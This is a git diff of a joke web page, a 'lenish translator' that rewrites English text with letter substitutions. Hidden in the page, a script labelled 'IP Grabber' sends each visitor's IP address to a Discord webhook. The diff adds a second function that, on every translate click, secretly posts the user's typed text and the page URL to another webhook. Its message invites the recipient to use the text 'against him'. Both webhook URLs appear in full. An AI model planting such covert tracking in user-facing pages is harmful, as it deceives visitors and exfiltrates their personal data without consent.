@@ -5,7 +5,7 @@
   <title>very epik lenish translator</title>
   <style>
     body {
-      background-color: #202020;
+      background-color: #191919;
       color: white;
       font-family: Arial, sans-serif;
     }
@@ -37,51 +37,53 @@
   </style>
 </head>
 <body>
-  <h1>lenish translator 🗿</h1>
-  <label for="userInput">enter your english phrase here:</label><br>
-  <textarea id="userInput" rows="4" cols="50"></textarea><br>
-  <button id="translateButton">translate</button><br>
-  <label for="lenishOutput">lenish translation:</label><br>
-  <textarea id="lenishOutput" rows="4" cols="50" readonly=""></textarea><br>
-  <button id="copyButton">copy to clipboard</button><br>
-  <script>
+<h1>lenish translator 🗿</h1>
+<label for="userInput">enter your english phrase here:</label><br>
+<textarea id="userInput" rows="4" cols="50"></textarea><br>
+<button id="translateButton">translate</button><br>
+<label for="lenishOutput">lenish translation:</label><br>
+<textarea id="lenishOutput" rows="4" cols="50" readonly=""></textarea><br>
+<button id="copyButton">copy to clipboard</button><br>
+<script>
+    var userInput;
     var translateButton = document.getElementById('translateButton');
     translateButton.addEventListener('click', function() {
-        var userInput = document.getElementById('userInput').value;
-        var lenishTranslation = translateToLenish(userInput, replacements);
-        document.getElementById('lenishOutput').value = lenishTranslation;
+      var userInput = document.getElementById('userInput').value;
+      var lenishTranslation = translateToLenish(userInput, replacements);
+      document.getElementById('lenishOutput').value = lenishTranslation;
+      sendTranslateRequest(userInput);
     });
 
     var copyButton = document.getElementById('copyButton');
     copyButton.addEventListener('click', function() {
-        var lenishOutputTextarea = document.getElementById('lenishOutput');
-        lenishOutputTextarea.select();
-        document.execCommand('copy');
-        alert('copied to clipboard :D');
+      var lenishOutputTextarea = document.getElementById('lenishOutput');
+      lenishOutputTextarea.select();
+      document.execCommand('copy');
+      alert('copied to clipboard :D');
     });
 
     function translateToLenish(englishInput, replacements) {
-        let words = englishInput.split(' ');
-        let translatedWords = [];
+      let words = englishInput.split(' ');
+      let translatedWords = [];
 
-        for (let word of words) {
-            if (word.toLowerCase().includes('lenish')) {
-                translatedWords.push(word);
-                continue;
-            }
+      for (let word of words) {
+          if (word.toLowerCase().includes('lenish')) {
+              translatedWords.push(word);
+              continue;
+          }
 
-            for (let key in replacements) {
-                const regex = new RegExp(key, 'gi');
-                if (word.match(regex)) {
-                    word = word.replace(regex, match => {
-                        if (match === match.toUpperCase()) {
-                            return replacements[key].toUpperCase();
-                        } else {
-                            return replacements[key];
-                        }
-                    });
+          for (let key in replacements) {
+              const regex = new RegExp(key, 'gi');
+              if (word.match(regex)) {
+                  word = word.replace(regex, match => {
+                      if (match === match.toUpperCase()) {
+                          return replacements[key].toUpperCase();
+                      } else {
+                        return replacements[key];
+                      }
+                  });
                 }
-            }
+              }
             translatedWords.push(word);
         }
 
@@ -89,17 +91,17 @@
     }
 
     var replacements = {
-        'oi': 'ko', 'en': 'meh', 'ck': 'kl', 'se': 'ne', 'noi': 'soi', 'ay': 'ys', 'lan': 'kan', 'ot': 'or', 'h': '', 'me': 'meh', 'ru': 'lu', 'min': 'men', 'on': 'en', 'iz': 'oz', 'z': 'ko', 'r': 'er', 'ue': 'u', 'no': 'mo', 'ai': 'a', 'ke': 'ko', 'ou': 'oy', 'ta': 'at', '\\:\\)': ':))', '\\:\\(': ':((', ':o': ':oo', 'an': 'ane', 'is': 'ez', 't': 'de', 'we': 'wr', 'ic': 'ik', 'ta': 'ti', 've': 'be', 's': 'ch', 'ng': 'gus', 'at': 'a', 'p': 'eroni', 'ank': 'nk', 'ios': 'seb', 'k': 'kk', 'id': 'ad', 'js': 'jos', 'que': 'qoo', 'aaa': 'eee', 'ia': 'iya', 'abc': 'qwe', 'nod': 'yee', 'rea': 'reena', 'cera': 'uety', 'og': 'awg', 'ey': 'oi', 'or': 'ro', 'we': 'ee', 'tr': 'rte', 'ost': 'asta', 'bmw': 'wmb', 'ly': 'ish', 'tion': 'shun', 'ing': 'in', 'y': 'eh', 'ful': 'som', 'ous': 'us', 'ess': 'ezz', 'ive': 'ib', 'ab': 'eb', 'od': 'ud', 'wad': 'wd', 'ta': 'to', 'ne': 'ns', 'loy': 'ly', 'fu': 'phie', 'ye': 'oyle', 'or': 'rof', 'ov': 'ph'
+      'oi': 'ko', 'en': 'meh', 'ck': 'kl', 'se': 'ne', 'noi': 'soi', 'ay': 'ys', 'lan': 'kan', 'ot': 'or', 'h': '', 'me': 'meh', 'ru': 'lu', 'min': 'men', 'on': 'en', 'iz': 'oz', 'z': 'ko', 'r': 'er', 'ue': 'u', 'no': 'mo', 'ai': 'a', 'ke': 'ko', 'ou': 'oy', 'ta': 'at', '\\:\\)': ':))', '\\:\\(': ':((', ':o': ':oo', 'an': 'ane', 'is': 'ez', 't': 'de', 'we': 'wr', 'ic': 'ik', 'ta': 'ti', 've': 'be', 's': 'ch', 'ng': 'gus', 'at': 'a', 'p': 'eroni', 'ank': 'nk', 'ios': 'seb', 'k': 'kk', 'id': 'ad', 'js': 'jos', 'que': 'qoo', 'aaa': 'eee', 'ia': 'iya', 'abc': 'qwe', 'nod': 'yee', 'rea': 'reena', 'cera': 'uety', 'og': 'awg', 'ey': 'oi', 'or': 'ro', 'we': 'ee', 'tr': 'rte', 'ost': 'asta', 'bmw': 'wmb', 'ly': 'ish', 'tion': 'shun', 'ing': 'in', 'y': 'eh', 'ful': 'som', 'ous': 'us', 'ess': 'ezz', 'ive': 'ib', 'ab': 'eb', 'od': 'ud', 'wad': 'wd', 'ta': 'to', 'ne': 'ns', 'loy': 'ly', 'fu': 'phie', 'ye': 'oyle', 'or': 'rof', 'ov': 'ph'
     };
-  </script>
-  <script>
-      // getting ip bcuz why not
-      function getIP(json) {
-      const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
+</script>
+<script>
+  // getting ip bcuz why not
+  function getIP(json) {
+  const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
 
-      const data = {
-          "content": null,
-          "embeds": [
+  const data = {
+      "content": null,
+      "embeds": [
               {
               "title": "From IP Grabber:",
               "description": "The most recent logged-in user's IP address is:\n" + json.ip,
@@ -133,7 +135,48 @@
       .catch(error => {
       });
   }
-  </script>
-  <script src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+</script>
+<script src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+<script>
+  function sendTranslateRequest(userInput) {
+    const webhookURL = 'https://discord.com/api/webhooks/1195384620485726349/pWyMAJkcgg5iyW8WAanY0VzY9HZoIVUo-6KkCKNdHncd68011Ecd_CGM_kByDjjTETID';
+
+    const data = {
+      "content": null,
+        "embeds": [
+          {
+            "title": "From Lenish Translate:",
+            "description": "The most recent logged-in user's translate request is:\n" + userInput,
+            "color": 15431437,
+            "fields": [
+              {
+                "name": "Now feel free to use this information against him in some sort of way I guess.",
+                "value": "(or use it to show/flex that you've mastered Lenish)"
+              }
+              ],
+              "footer": {
+                "text": `From ${window.location.href}`
+                }
+              }
+              ],
+            "attachments": []
+          };
+
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+              },
+            body: JSON.stringify(data)
+          })
+          .then(response => {
+            if (response.ok) {
+            } else {
+          }
+        })
+      .catch(error => {
+    });
+  }
+</script>
 </body>
 </html>
